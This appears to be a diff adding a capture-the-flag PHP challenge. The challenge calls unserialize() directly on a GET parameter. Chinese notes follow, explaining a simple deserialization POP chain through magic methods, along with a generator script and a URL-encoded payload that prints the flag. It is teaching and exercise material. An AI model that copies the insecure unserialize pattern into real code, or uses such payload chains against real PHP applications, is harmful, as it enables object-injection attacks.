@@ -1,0 +1,60 @@
+<?php
+include "flag.php";
+highlight_file(__FILE__);
+
+class Moon{
+        public $name="月亮";
+        public function __toString(){
+                return $this->name;
+        }
+        public function __wakeup(){
+                echo "我是".$this->name."快来赏我";
+        }
+}
+
+class Ion_Fan_Princess{
+        public $nickname="牛夫人";
+
+        public function call(){
+                global $flag;
+                if ($this->nickname=="小甜甜"){
+                        echo $flag;
+                }else{
+                        echo "以前陪我看月亮的时候，叫人家小甜甜！现在新人胜旧人，叫人家".$this->nickname."。\n";
+                        echo "你以为我这么辛苦来这里真的是为了这条臭牛吗?是为了你这个没良心的臭猴子啊!\n";
+                }
+        }
+        public function __toString(){
+                $this->call();
+                return "\t\t\t\t\t\t\t\t\t\t----".$this->nickname;
+        }
+}
+
+if (isset($_GET['code'])){
+        unserialize($_GET['code']);
+
+}else{
+        $a=new Ion_Fan_Princess();
+        echo $a;
+}
+
+
+简单的反序列化pop链：
+Moon::__wakeup()==>Ion_Fan_Princess::__toString()==>Ion_Fan_Princess::call()
+
+payload:
+<?php
+class Moon{
+        public $name;
+}
+class Ion_Fan_Princess{
+        public $nickname;
+}
+
+$a=new Moon();
+$a->name=new Ion_Fan_Princess();
+$a->name->nickname="小甜甜";
+echo urlencode(serialize($a));
+
+
+payload:?code=O%3A4%3A"Moon"%3A1%3A%7Bs%3A4%3A"name"%3BO%3A16%3A"Ion_Fan_Princess"%3A1%3A%7Bs%3A8%3A"nickname"%3Bs%3A9%3A"小甜甜"%3B%7D%7D
